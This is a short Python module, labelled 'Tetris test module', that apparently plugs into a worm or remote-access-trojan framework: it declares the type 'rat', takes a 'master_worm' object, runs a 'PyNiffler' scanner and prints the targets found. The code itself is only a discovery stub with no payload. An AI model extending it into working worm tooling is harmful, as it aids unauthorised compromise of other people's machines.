#!name##TMod
#!itemType##module
#!fileType##PY_MOD
#!info##Tetris test module
#!hiveType##PySM
#!lang##python
#!pyModName##Kaloryfer
#!reqMod##PyNiffler
#!pyType##module

from time import sleep


class Kaloryfer:
    MTYPES = "rat"
    STAND_TH = False
    def __init__(self, master_worm: object):
        self.worm = master_worm
        self.niffler = PyNiffler()
    
    def work(self) -> None:
        self.niffler.start()
        while self.niffler.WORKING_FLAG_FIND:
            sleep(0.1)
        for t in self.niffler.Targets:
            print(t)
    
    def start(self) -> None:
        print("Kaloryfer start")
        self.work()